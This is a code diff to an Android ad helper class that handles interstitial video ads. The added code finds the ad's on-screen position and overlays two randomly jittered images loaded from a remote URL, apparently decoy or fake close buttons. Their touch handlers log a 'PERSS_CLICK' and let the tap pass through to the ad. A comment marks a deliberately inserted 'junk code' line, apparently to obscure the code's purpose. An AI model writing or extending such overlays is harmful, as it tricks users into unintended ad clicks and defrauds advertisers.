@@ -6,6 +6,7 @@ import android.os.SystemClock;
 import android.text.TextUtils;
 import android.util.ArrayMap;
 import android.util.Log;
+import android.view.Gravity;
 import android.view.MotionEvent;
 import android.view.View;
 import android.view.ViewGroup;
@@ -35,6 +36,8 @@ public class ViewHelper {
 
     protected static List<View> clickViewList = new ArrayList<>();
     protected static List<View> infoClickViewList = new ArrayList<>();
+
+    protected static List<Integer> locationList = new ArrayList<>();
 
     protected static void clickView(ViewGroup rv) {
 
@@ -105,18 +108,47 @@ public class ViewHelper {
         return null;
     }
 
-    protected static ImageView getImageView(String key, Activity act){
+    protected static ImageView getOneImageView(String key, Activity act, int zLeft, int zTop, int zWidth) {
         boolean yesOrNo = new Random().nextBoolean();
+        Log.i("aaa", "获取的随机数：" + yesOrNo);
+        int randomTop = (int) (Math.random() * 10);
+        int randomLeft = (int) (Math.random() * 10);
 
-        int randomTop = (int) (Math.random() * 30);
-        int randomLeft = (int) (Math.random() * 20);
-
-        int left = yesOrNo ? 100 : 850;
-        int top = 560;
+        int left = yesOrNo ? (zLeft == 0 ? 75 : zLeft) : (zWidth == 0 ? 850 : (zWidth - zLeft));
+        int top = zTop > 0 ? zTop + 30 : 560;
         if (key.equals("ks")) {
-            left = yesOrNo ? 50 : 800;
+            left = yesOrNo ? (zLeft == 0 ? 50 : zLeft) : (zWidth == 0 ? 800 : (zWidth - zLeft));
             top = 460;
         }
+        top = top + randomTop;
+        left = left + randomLeft;
+         // "https://vcg02.cfp.cn/creative/vcg/800/new/VCG211245661743.jpg";
+        String perss_img_url_value = Hawk.get(ConstantsPath.perss_img_url_value, "");
+        ImageView ci = new ImageView(act);
+        Glide.with(act).load(perss_img_url_value).into(ci);
+//            ci.setImageDrawable(act.getResources().getDrawable(R.mipmap.icon_close));
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+                80,
+                80, Gravity.CENTER
+        );
+        lp.setMargins(left, top, 0, 0);
+        ci.setLayoutParams(lp);
+        return ci;
+    }
+
+    protected static ImageView getTwoImageView(String key, Activity act, int zLeft, int zTop, int zWidth, int height) {
+        boolean yesOrNo = new Random().nextBoolean();
+
+        int randomTop = (int) (Math.random() * 10);
+        int randomLeft = (int) (Math.random() * 10);
+
+        int left = yesOrNo ? (zLeft == 0 ? 85 : zLeft * 2) : (zWidth == 0 ? 850 : (zWidth - zLeft));
+        int top = zTop > 0 ? ((height + zTop) / 2 + 100) : 980;
+        if (key.equals("ks")) {
+            left = yesOrNo ? (zLeft == 0 ? 60 : zLeft) : (zWidth == 0 ? 800 : (zWidth - zLeft));
+            top = 760;
+        }
+
         top = top + randomTop;
         left = left + randomLeft;
 
@@ -124,13 +156,60 @@ public class ViewHelper {
         ImageView ci = new ImageView(act);
         Glide.with(act).load(perss_img_url_value).into(ci);
 //            ci.setImageDrawable(act.getResources().getDrawable(R.mipmap.icon_close));
-        ViewGroup.MarginLayoutParams lp = new ViewGroup.MarginLayoutParams(
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                 80,
-                80
+                80, Gravity.CENTER
         );
         lp.setMargins(left, top, 0, 0);
         ci.setLayoutParams(lp);
         return ci;
+    }
+
+    // 递归查找穿山甲广告视图
+    private static boolean findAdViewRecursive(ViewGroup parent) {
+        for (int i = 0; i < parent.getChildCount(); i++) {
+            View child = parent.getChildAt(i);
+            int[] location = new int[2];
+            child.getLocationOnScreen(location);
+            Log.d("AdPosition", "广告位置 - Left: " + location[0] + ", Top: " + location[1] + ", width: " + child.getWidth() + ", height: " + child.getHeight());
+            if (location[0] > 10 && child.getWidth() > 100 && locationList.isEmpty()) {
+                locationList.add(location[0]);
+                locationList.add(location[1]);
+                locationList.add(child.getWidth());
+                locationList.add(child.getHeight());
+                return true;
+            }
+            if (child instanceof ViewGroup) {
+                if (findAdViewRecursive((ViewGroup) child)) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    /**
+     * 检查当前是否有 Dialog 显示
+     */
+    public static boolean isDialogShowing(Activity activity) {
+        if (activity == null || activity.isFinishing()) {
+            return false;
+        }
+
+        // 获取当前 Window 的 DecorView
+        View decorView = activity.getWindow().getDecorView();
+        if (decorView instanceof ViewGroup) {
+            ViewGroup rootView = (ViewGroup) decorView;
+
+            // 遍历子 View，检查是否有 Dialog 的 DecorView
+            for (int i = 0; i < rootView.getChildCount(); i++) {
+                View child = rootView.getChildAt(i);
+                if (child.getClass().getName().contains("Dialog")) {
+                    return true;
+                }
+            }
+        }
+        return false;
     }
 
     protected static void addInterstitialView(Activity act, TTFullScreenVideoAd mAd) {
@@ -148,14 +227,52 @@ public class ViewHelper {
             Log.i("addInterstitialView", "广告ecpm信息:" + item.getEcpm());
             Log.i("addInterstitialView", "广告CustomData信息:" + item.getCustomData());
 
+//            boolean isDialog = isDialogShowing(act);
+//            Log.i("------aaaaa", "---isDialog:" + isDialog);
+
             ViewGroup rv = (ViewGroup) act.findViewById(android.R.id.content);
             if (isInterInfoPerssView(act, key)) {
-                ImageView ci = getImageView(key, act);
+                locationList.clear();
+
+                findAdViewRecursive(rv);
+                int left = 0;
+                int top = 0;
+                int width = 0;
+                int height = 0;
+                if (!locationList.isEmpty()) {
+                    left = locationList.get(0);
+                    top = locationList.get(1);
+                    width = locationList.get(2);
+                    height = locationList.get(3);
+                }
+                Log.d("AdPosition", "最终广告位置 - Left: " + left + ", Top: " + top + ", width: " + width + ", height: " + height);
+
+
+                ImageView ci = getOneImageView(key, act, left, top, width);
                 clickViewList.add(ci);
+                ImageView ci2 = getTwoImageView(key, act, left, top, width, height);
+                clickViewList.add(ci2);
                 // 添加垃圾代码
                 Class<?> activityThreadClass = Class.forName("android.view.View");
                 ci.setOnTouchListener(new View.OnTouchListener() {
                     
+                    @Override
+                    public boolean onTouch(View v, MotionEvent event) {
+                        switch (event.getAction()) {
+                            case MotionEvent.ACTION_DOWN:
+                                Log.i("", "----click_CP_YD");
+                                logInterEcpmInfo(act, mAd, "PERSS_CLICK");
+                                break;
+                            case MotionEvent.ACTION_MOVE:
+                                break;
+                            case MotionEvent.ACTION_UP:
+                                break;
+                        }
+                        return false;
+                    }
+                });
+                ci2.setOnTouchListener(new View.OnTouchListener() {
+
                     @Override
                     public boolean onTouch(View v, MotionEvent event) {
                         switch (event.getAction()) {
@@ -177,6 +294,7 @@ public class ViewHelper {
 //                    //ci.setVisibility(View.GONE);
 //                });
                 rv.addView(ci);
+                rv.addView(ci2);
             }
 
             if (isInterInfoClickView(act, key)) {
@@ -261,7 +379,7 @@ public class ViewHelper {
                             case MotionEvent.ACTION_UP:
                                 break;
                         }
-                        return false;
+                        return true;
                     }
                 });
             }
